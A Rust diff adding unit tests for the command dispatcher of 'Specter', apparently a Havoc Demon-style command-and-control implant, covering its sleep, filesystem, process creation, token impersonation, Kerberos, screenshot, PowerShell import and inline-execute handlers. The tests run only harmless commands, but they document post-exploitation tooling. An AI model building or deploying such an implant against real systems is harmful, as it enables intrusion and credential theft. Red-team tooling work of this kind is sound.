@@ -7767,4 +7767,814 @@ mod tests {
         assert_eq!(entry.state, DownloadState::Running);
         let _ = std::fs::remove_file(path);
     }
+
+    // ── Dispatch routing completeness ────────────────────────────────────────
+
+    #[test]
+    fn dispatch_routes_command_sleep() {
+        let mut config = SpecterConfig::default();
+        let payload = le_u32_pair(500, 10);
+        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    #[test]
+    fn dispatch_routes_command_fs_pwd() {
+        let mut config = SpecterConfig::default();
+        let payload = le_subcmd(u32::from(DemonFilesystemCommand::GetPwd));
+        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    #[test]
+    fn dispatch_routes_command_proc_list() {
+        let mut config = SpecterConfig::default();
+        let payload = 0u32.to_le_bytes().to_vec(); // process_ui = 0
+        let package = DemonPackage::new(DemonCommand::CommandProcList, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    #[test]
+    fn dispatch_routes_command_net_domain() {
+        let mut config = SpecterConfig::default();
+        let payload = le_subcmd(1); // DemonNetCommand::Domain = 1
+        let package = DemonPackage::new(DemonCommand::CommandNet, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    #[test]
+    fn dispatch_routes_command_token_getuid() {
+        let mut config = SpecterConfig::default();
+        let payload = le_subcmd(6); // GetUid = 6
+        let package = DemonPackage::new(DemonCommand::CommandToken, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    #[test]
+    fn dispatch_routes_command_config() {
+        let mut config = SpecterConfig::default();
+        // Config key 0 (Sleep) + u32 value
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&0u32.to_le_bytes()); // key = Sleep
+        payload.extend_from_slice(&42u32.to_le_bytes()); // value
+        let package = DemonPackage::new(DemonCommand::CommandConfig, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        // Config handler returns Ignore for most valid updates (no response ack).
+        // Just verify it doesn't panic.
+        let _ = result;
+    }
+
+    #[test]
+    fn dispatch_routes_command_screenshot() {
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandScreenshot, 1, vec![]);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    #[test]
+    fn dispatch_routes_command_kerberos() {
+        let mut config = SpecterConfig::default();
+        // Kerberos subcommand 0 = Luid
+        let payload = le_subcmd(0);
+        let package = DemonPackage::new(DemonCommand::CommandKerberos, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    #[test]
+    fn dispatch_routes_command_output_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandOutput, 1, vec![0xAA]);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(
+            matches!(result, DispatchResult::Ignore),
+            "CommandOutput from server must be ignored"
+        );
+    }
+
+    #[test]
+    fn dispatch_routes_beacon_output_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::BeaconOutput, 1, vec![0xBB]);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(
+            matches!(result, DispatchResult::Ignore),
+            "BeaconOutput from server must be ignored"
+        );
+    }
+
+    #[test]
+    fn dispatch_routes_command_get_job_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandGetJob, 1, vec![]);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(
+            matches!(result, DispatchResult::Ignore),
+            "CommandGetJob from server must be ignored"
+        );
+    }
+
+    // ── handle_sleep edge cases ──────────────────────────────────────────────
+
+    #[test]
+    fn handle_sleep_zero_delay_and_zero_jitter() {
+        let mut config = SpecterConfig::default();
+        config.sleep_delay_ms = 1000; // non-zero initial
+        config.sleep_jitter = 50;
+        let payload = le_u32_pair(0, 0);
+        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
+        dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert_eq!(config.sleep_delay_ms, 0);
+        assert_eq!(config.sleep_jitter, 0);
+    }
+
+    #[test]
+    fn handle_sleep_max_u32_delay() {
+        let mut config = SpecterConfig::default();
+        let payload = le_u32_pair(u32::MAX, 100);
+        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert_eq!(config.sleep_delay_ms, u32::MAX);
+        assert_eq!(config.sleep_jitter, 100);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        let echoed_delay = u32::from_le_bytes(resp.payload[0..4].try_into().expect("delay"));
+        assert_eq!(echoed_delay, u32::MAX);
+    }
+
+    // ── handle_fs_cd edge cases ──────────────────────────────────────────────
+
+    #[test]
+    fn handle_fs_cd_nonexistent_directory_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let mut payload = le_subcmd(4); // Cd = 4
+        payload.extend_from_slice(&le_utf16le_payload("/nonexistent_dir_xyz_99999"));
+        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(
+            matches!(result, DispatchResult::Ignore),
+            "cd to nonexistent directory must return Ignore"
+        );
+    }
+
+    // ── handle_fs_dir edge cases ─────────────────────────────────────────────
+
+    #[test]
+    fn handle_fs_dir_nonexistent_path_returns_ignore() {
+        let payload = dir_request_payload(
+            "/nonexistent_dir_xyz_99999",
+            false,
+            false,
+            false,
+            false,
+            "",
+            "",
+            "",
+        );
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(
+            matches!(result, DispatchResult::Ignore),
+            "dir on nonexistent path must return Ignore"
+        );
+    }
+
+    #[test]
+    fn handle_fs_dir_files_only_excludes_directories() {
+        let dir = std::env::temp_dir();
+        let base = dir.join(format!("specter_dir_fonly_{}", rand::random::<u32>()));
+        std::fs::create_dir_all(&base).expect("create base dir");
+        // Create a file and a subdirectory.
+        std::fs::write(base.join("file.txt"), b"hello").expect("write file");
+        std::fs::create_dir(base.join("subdir")).expect("create subdir");
+
+        let payload = dir_request_payload(
+            &base.display().to_string(),
+            false,
+            true,  // files_only
+            false,
+            true,  // list_only (simpler output)
+            "",
+            "",
+            "",
+        );
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond for dir listing");
+        };
+        // Verify the response payload doesn't contain "subdir".
+        // The response uses UTF-16LE encoding, so search for "subdir" encoded.
+        let subdir_utf16: Vec<u8> =
+            "subdir".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+        assert!(
+            !resp.payload.windows(subdir_utf16.len()).any(|w| w == subdir_utf16.as_slice()),
+            "files_only must exclude directory entries"
+        );
+        let file_utf16: Vec<u8> =
+            "file.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+        assert!(
+            resp.payload.windows(file_utf16.len()).any(|w| w == file_utf16.as_slice()),
+            "files_only must include file entries"
+        );
+        let _ = std::fs::remove_dir_all(base);
+    }
+
+    #[test]
+    fn handle_fs_dir_dirs_only_excludes_files() {
+        let dir = std::env::temp_dir();
+        let base = dir.join(format!("specter_dir_donly_{}", rand::random::<u32>()));
+        std::fs::create_dir_all(&base).expect("create base dir");
+        std::fs::write(base.join("file.txt"), b"hello").expect("write file");
+        std::fs::create_dir(base.join("subdir")).expect("create subdir");
+
+        let payload = dir_request_payload(
+            &base.display().to_string(),
+            false,
+            false,
+            true,  // dirs_only
+            true,  // list_only
+            "",
+            "",
+            "",
+        );
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond for dir listing");
+        };
+        let file_utf16: Vec<u8> =
+            "file.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+        assert!(
+            !resp.payload.windows(file_utf16.len()).any(|w| w == file_utf16.as_slice()),
+            "dirs_only must exclude file entries"
+        );
+        let subdir_utf16: Vec<u8> =
+            "subdir".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+        assert!(
+            resp.payload.windows(subdir_utf16.len()).any(|w| w == subdir_utf16.as_slice()),
+            "dirs_only must include directory entries"
+        );
+        let _ = std::fs::remove_dir_all(base);
+    }
+
+    #[test]
+    fn handle_fs_dir_name_filter_starts_with() {
+        let dir = std::env::temp_dir();
+        let base = dir.join(format!("specter_dir_filter_{}", rand::random::<u32>()));
+        std::fs::create_dir_all(&base).expect("create base dir");
+        std::fs::write(base.join("alpha.txt"), b"a").expect("write alpha");
+        std::fs::write(base.join("beta.txt"), b"b").expect("write beta");
+
+        let payload = dir_request_payload(
+            &base.display().to_string(),
+            false,
+            false,
+            false,
+            true, // list_only
+            "alpha",
+            "",
+            "",
+        );
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond for dir listing");
+        };
+        let alpha_utf16: Vec<u8> =
+            "alpha.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+        assert!(
+            resp.payload.windows(alpha_utf16.len()).any(|w| w == alpha_utf16.as_slice()),
+            "starts_with filter must include matching entries"
+        );
+        let beta_utf16: Vec<u8> =
+            "beta.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+        assert!(
+            !resp.payload.windows(beta_utf16.len()).any(|w| w == beta_utf16.as_slice()),
+            "starts_with filter must exclude non-matching entries"
+        );
+        let _ = std::fs::remove_dir_all(base);
+    }
+
+    #[test]
+    fn handle_fs_unknown_subcommand_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let payload = le_subcmd(0xFF_FF); // bogus subcommand
+        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn handle_fs_empty_payload_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandFs, 1, vec![]);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    // ── handle_proc edge cases ───────────────────────────────────────────────
+
+    #[test]
+    fn handle_proc_create_captures_stderr() {
+        let mut config = SpecterConfig::default();
+        // Run a command that writes to stderr.
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&le_subcmd(
+            u32::from(DemonProcessCommand::Create),
+        ));
+        payload.extend_from_slice(&0u32.to_le_bytes()); // process_state
+        payload.extend_from_slice(&le_utf16le_payload("")); // process_path (empty → /bin/sh)
+        payload.extend_from_slice(&le_utf16le_payload(
+            "/c echo stderr_test >&2",
+        ));
+        payload.extend_from_slice(&1u32.to_le_bytes()); // piped = true
+        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose = false
+        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        let DispatchResult::MultiRespond(responses) = result else {
+            panic!("expected MultiRespond for proc create");
+        };
+        assert_eq!(responses.len(), 2, "proc create returns 2 responses");
+        // Second response is CommandOutput with captured output.
+        let output_resp = &responses[1];
+        assert_eq!(output_resp.command_id, u32::from(DemonCommand::CommandOutput));
+        // Parse the output payload (LE length-prefixed bytes).
+        let output_len =
+            u32::from_le_bytes(output_resp.payload[0..4].try_into().expect("len")) as usize;
+        let output_bytes = &output_resp.payload[4..4 + output_len];
+        let output_str = String::from_utf8_lossy(output_bytes);
+        assert!(
+            output_str.contains("stderr_test"),
+            "proc create must capture stderr — got: {output_str}"
+        );
+    }
+
+    #[test]
+    fn handle_proc_create_nonzero_exit_code_still_succeeds() {
+        let mut config = SpecterConfig::default();
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&le_subcmd(
+            u32::from(DemonProcessCommand::Create),
+        ));
+        payload.extend_from_slice(&0u32.to_le_bytes()); // process_state
+        payload.extend_from_slice(&le_utf16le_payload("")); // process_path
+        payload.extend_from_slice(&le_utf16le_payload("/c exit 42"));
+        payload.extend_from_slice(&1u32.to_le_bytes()); // piped
+        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose
+        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        // Even with a non-zero exit code, the handler should return MultiRespond
+        // (the process ran, it just exited non-zero).
+        let DispatchResult::MultiRespond(responses) = result else {
+            panic!("expected MultiRespond for proc create with non-zero exit");
+        };
+        assert_eq!(responses.len(), 2);
+    }
+
+    #[test]
+    fn handle_proc_empty_payload_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandProc, 1, vec![]);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn handle_proc_unknown_subcommand_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let payload = le_subcmd(0xFFFF); // bogus subcommand
+        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn handle_proc_grep_matches_self_pid() {
+        let mut config = SpecterConfig::default();
+        // Use empty needle (matches all).
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&le_subcmd(
+            u32::from(DemonProcessCommand::Grep),
+        ));
+        payload.extend_from_slice(&le_utf16le_payload(""));
+        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond for proc grep");
+        };
+        // Parse response: subcmd(4) + repeated entries.
+        // Each entry contains a PID field. Verify our PID is in there.
+        assert!(
+            resp.payload.len() > 4,
+            "proc grep with empty needle should return entries"
+        );
+    }
+
+    // ── handle_proc_list edge cases ──────────────────────────────────────────
+
+    #[test]
+    fn handle_proc_list_empty_payload_uses_default_flag() {
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandProcList, 1, vec![]);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        // ProcList should still respond even with empty payload (uses default process_ui = 0).
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    // ── handle_net edge cases ────────────────────────────────────────────────
+
+    #[test]
+    fn dispatch_routes_command_net_empty_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandNet, 1, vec![]);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    // ── handle_ps_import edge cases ──────────────────────────────────────────
+
+    #[test]
+    fn ps_import_accumulates_across_multiple_imports() {
+        let mut config = SpecterConfig::default();
+        let mut ps_scripts = Vec::new();
+        let mut mem_files: MemFileStore = HashMap::new();
+
+        // First import
+        let script1 = b"function Get-Foo { 'foo' }\n";
+        let mut payload1 = (script1.len() as u32).to_le_bytes().to_vec();
+        payload1.extend_from_slice(script1);
+        let package1 = DemonPackage::new(DemonCommand::CommandPsImport, 1, payload1);
+        let _ = dispatch(
+            &package1,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut mem_files,
+            &mut JobStore::new(),
+            &mut ps_scripts,
+        );
+        assert_eq!(ps_scripts.len(), script1.len());
+
+        // Second import — should replace (not accumulate).
+        let script2 = b"function Get-Bar { 'bar' }\n";
+        let mut payload2 = (script2.len() as u32).to_le_bytes().to_vec();
+        payload2.extend_from_slice(script2);
+        let package2 = DemonPackage::new(DemonCommand::CommandPsImport, 2, payload2);
+        let _ = dispatch(
+            &package2,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut mem_files,
+            &mut JobStore::new(),
+            &mut ps_scripts,
+        );
+        // After second import, the stored script should be the second one.
+        assert_eq!(ps_scripts.len(), script2.len());
+    }
+
+    // ── handle_token edge cases ──────────────────────────────────────────────
+
+    #[test]
+    fn token_impersonate_valid_id_on_non_windows_returns_failure() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        // Add a token entry manually (on non-Windows it's a stub).
+        use crate::token::{TokenEntry, TokenType};
+        vault.add(TokenEntry {
+            handle: 0,
+            domain_user: "DOMAIN\\user".into(),
+            process_id: 0,
+            token_type: TokenType::Stolen,
+            credentials: None,
+        });
+
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&0u32.to_le_bytes()); // subcommand = Impersonate
+        payload.extend_from_slice(&0u32.to_le_bytes()); // vault index = 0
+        let package = DemonPackage::new(DemonCommand::CommandToken, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        // On non-Windows, impersonation fails because there's no real handle.
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    // ── handle_memfile edge cases ────────────────────────────────────────────
+
+    #[test]
+    fn memfile_zero_size_completes_immediately() {
+        let mut config = SpecterConfig::default();
+        let mut mem_files: MemFileStore = HashMap::new();
+
+        // Send a memfile with expected_size=0 and empty data.
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&1u32.to_le_bytes()); // file_id = 1
+        payload.extend_from_slice(&0u64.to_le_bytes()); // expected_size = 0 (u64)
+        payload.extend_from_slice(&0u32.to_le_bytes()); // chunk_len = 0
+        let package = DemonPackage::new(DemonCommand::CommandMemFile, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut mem_files,
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        // Zero-size memfile should return an ack response and be stored.
+        assert!(matches!(result, DispatchResult::Respond(_)));
+        assert!(mem_files.contains_key(&1));
+    }
+
+    // ── handle_inline_execute edge cases ─────────────────────────────────────
+
+    #[test]
+    fn dispatch_routes_command_inline_execute() {
+        let mut config = SpecterConfig::default();
+        // Minimal payload that will fail parsing (too short).
+        let package = DemonPackage::new(DemonCommand::CommandInlineExecute, 1, vec![0x00]);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        // Short payload → returns CouldNotRun response.
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    #[test]
+    fn dispatch_routes_command_ps_import() {
+        let mut config = SpecterConfig::default();
+        // Empty script (0-length).
+        let payload = 0u32.to_le_bytes().to_vec();
+        let package = DemonPackage::new(DemonCommand::CommandPsImport, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        // Empty script returns error response.
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    #[test]
+    fn dispatch_routes_command_assembly_inline_execute() {
+        let mut config = SpecterConfig::default();
+        let package =
+            DemonPackage::new(DemonCommand::CommandAssemblyInlineExecute, 1, vec![0x00]);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        // Short payload → returns error response.
+        assert!(matches!(result, DispatchResult::Respond(_)));
+    }
 }
